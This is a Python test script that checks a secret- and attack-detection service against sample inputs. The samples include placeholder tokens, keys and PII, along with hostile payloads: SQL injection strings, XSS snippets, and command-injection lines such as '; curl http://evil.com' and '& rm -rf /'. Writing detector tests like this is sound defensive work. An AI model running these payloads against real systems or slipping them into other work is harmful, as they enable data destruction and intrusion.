"""
Detection Quality Validation
Tests patterns against real-world inputs and edge cases
"""
from app.services.detector import DetectorService

detector = DetectorService()

# Test cases: (name, content, expected_detections, should_not_detect)
test_cases = [
    # GitHub Tokens
    ("GitHub PAT - Valid", "ghp_1234567890123456789012345678901234567890", ["GitHub PAT"], []),
    ("GitHub PAT - Invalid Length", "ghp_123", [], ["GitHub PAT"]),
    ("GitHub OAuth", "gho_1234567890123456789012345678901234567890", ["GitHub OAuth"], []),

    # AWS Keys
    ("AWS Access Key - Valid", "AKIA1234567890ABCDEF", ["AWS Access Key"], []),
    ("AWS Access Key - Invalid", "AKIA123", [], ["AWS Access Key"]),
    ("AWS Secret in code", 'aws_secret_access_key = "abcdefghijklmnopqrstuvwxyz0123456789ab"', ["AWS Secret Key"], []),

    # Stripe Keys
    ("Stripe Live Key", "sk_live_EXAMPLE_KEY_FOR_TESTING", ["Stripe Live Key"], []),
    ("Stripe Test Key", "sk_test_EXAMPLE_KEY_FOR_TESTING", ["Stripe Test Key"], []),
    ("Stripe - Not a key", "sk_", [], ["Stripe Live Key", "Stripe Test Key"]),

    # JWT Tokens
    ("JWT - Valid", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", ["JWT Token"], []),
    ("JWT - Incomplete", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", [], ["JWT Token"]),

    # Database URIs
    ("MongoDB URI", "mongodb://user:EXAMPLE_PASSWORD@localhost:27017/database", ["MongoDB URI"], []),
    ("PostgreSQL URI", "postgresql://user:pass@localhost:5432/db", ["PostgreSQL Connection"], []),
    ("MySQL URI", "mysql://root:EXAMPLE_PASSWORD@localhost:3306/mydb", ["MySQL Connection"], []),

    # SQL Injection
    ("SQL Injection - OR 1=1", "SELECT * FROM users WHERE id=1 OR 1=1", ["SQL Injection"], []),
    ("SQL Injection - UNION", "UNION SELECT password FROM admin", ["SQL Injection"], []),
    ("SQL Injection - DROP", "DROP TABLE users", ["SQL Injection"], []),
    ("SQL Injection - Comment", "SELECT * FROM users;--", ["SQL Injection"], []),
    ("Normal SQL - No injection", "SELECT * FROM users WHERE id = 123", [], ["SQL Injection"]),

    # XSS
    ("XSS - Script tag", "<script>alert('xss')</script>", ["XSS Pattern"], []),
    ("XSS - Event handler", '<img src=x onerror="alert(1)">', ["XSS Pattern"], []),
    ("XSS - javascript protocol", "javascript:alert(1)", ["XSS Pattern"], []),
    ("Normal HTML", "<div>Hello World</div>", [], ["XSS Pattern"]),

    # Command Injection
    ("Command Injection - curl", "; curl http://evil.com", ["Command Injection"], []),
    ("Command Injection - rm", "& rm -rf /", ["Command Injection"], []),
    ("Normal command", "echo hello", [], ["Command Injection"]),

    # PII
    ("Email - Valid", "user@example.com", ["Email Address"], []),
    ("Email - Invalid", "not-an-email", [], ["Email Address"]),
    ("Phone - US Format", "(555) 123-4567", ["Phone Number"], []),
    ("Phone - Dots", "555.123.4567", ["Phone Number"], []),

    # Credit Card
    ("Credit Card - Valid", "4532-1234-5678-9010", ["Credit Card"], []),
    ("Credit Card - No dashes", "4532123456789010", ["Credit Card"], []),
    ("Not a Credit Card", "123", [], ["Credit Card"]),

    # Behavioral - Repeated Failures
    ("Repeated Failures", "\n".join(["Login failed"] * 6), ["Repeated Failures"], []),
    ("Few Failures", "\n".join(["Login failed"] * 3), [], ["Repeated Failures"]),

    # Stack Traces
    ("Stack Trace", "Exception in thread 'main' java.lang.NullPointerException", ["Stack Trace"], []),
    ("Traceback", "Traceback (most recent call last):", ["Stack Trace"], []),

    # Debug Logs
    ("Debug Log", "DEBUG: User credentials exposed", ["Debug Log Leak"], []),
    ("Console Log", "console.log('password:', pass)", ["Debug Log Leak"], []),
    ("Normal Log", "INFO: Application started", [], ["Debug Log Leak"]),

    # Private Keys
    ("RSA Private Key", "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQ", ["Private Key"], []),
    ("SSH Private Key", "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk", ["SSH Private Key", "Private Key"], []),

    # Slack
    ("Slack Token", "xoxb-EXAMPLE-TOKEN-FOR-TESTING", ["Slack Token"], []),
    ("Slack Webhook", "https://hooks.slack.com/services/TXXXXXXXX/BXXXXXXXX/XXXXXXXXXXXXXXXX", ["Slack Webhook"], []),

    # Edge Cases
    ("Multiple Patterns", "email: user@test.com, token: ghp_1234567890123456789012345678901234567890", ["Email Address", "GitHub PAT"], []),
    ("Empty String", "", [], None),
    ("Only Whitespace", "   \n   ", [], None),
]

def run_tests():
    """Run all test cases and report results"""
    total = len(test_cases)
    passed = 0
    failed = 0

    print("=" * 80)
    print("DETECTION QUALITY VALIDATION")
    print("=" * 80)
    print()

    for name, content, expected, should_not_detect in test_cases:
        detections = detector.detect(content)
        detected_types = [d['type'] for d in detections]

        # Check expected detections
        missing = [e for e in expected if e not in detected_types]

        # Check should not detect
        false_positives = []
        if should_not_detect is not None:
            false_positives = [s for s in should_not_detect if s in detected_types]

        if not missing and not false_positives:
            passed += 1
            status = "✅ PASS"
        else:
            failed += 1
            status = "❌ FAIL"

        print(f"{status} | {name}")
        if missing:
            print(f"    Missing: {', '.join(missing)}")
        if false_positives:
            print(f"    False Positives: {', '.join(false_positives)}")
        if detected_types:
            print(f"    Detected: {', '.join(detected_types)}")
        print()

    print("=" * 80)
    print(f"Results: {passed}/{total} passed, {failed}/{total} failed")
    print(f"Success Rate: {(passed/total)*100:.1f}%")
    print("=" * 80)

    return passed == total

if __name__ == "__main__":
    success = run_tests()
    exit(0 if success else 1)
